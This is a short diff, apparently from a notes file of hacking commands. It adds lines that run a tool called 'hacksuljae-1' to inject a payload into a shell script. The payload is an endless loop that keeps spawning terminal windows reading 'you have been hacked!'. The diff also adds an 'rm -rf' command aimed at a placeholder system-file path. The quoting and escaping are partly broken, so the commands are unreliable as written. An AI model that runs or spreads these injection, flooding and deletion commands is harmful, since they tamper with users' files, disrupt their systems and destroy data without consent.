@@ -1,3 +1,6 @@
-./hacksuljae-1 /home/Downloads/my/hacksuljae/test0.sh 1 $\n'#!/bin/bash\nwhile true; do\ngnome-terminal -- bash -c 'echo "you have been hacked!"; read -p "Press Enter to continue or "'\ndone\n//' && sed -i '1d' /home/Downloads/my/hacksuljae/test0.sh 
+./hacksuljae-1 /home/test/Downloads/my/hacksuljae/test.sh 1 $\n'#!/bin/bash\nwhile true; do\ngnome-terminal -- bash -c \'echo \"you have been hacked!\"; read -p \"Press Enter to continue or \"\'\ndone\n//' && sed -i '1d' /home/test/Downloads/my/hacksuljae/test.sh
 
-./hacksuljae-1 /home/Downloads/my/hacksuljae/test0.sh 1 $'#!/bin/bash\nwhile true; do\ngnome-terminal -- bash -c 'echo "you have been hacked!"; read -p "Press Enter to continue or "'\ndone\n//
+#!/bin/bash
+rm -rf "시스템파일 경로"
+
+./hacksuljae-1 /home/test/Downloads/my/hacksuljae/test.sh 1 $\n'#!/bin/bash\nwhile true; do\ngnome-terminal -- bash -c \'echo \"you have been hacked!\"; read -p \"Press Enter to continue or \"\'\ndone\n//'
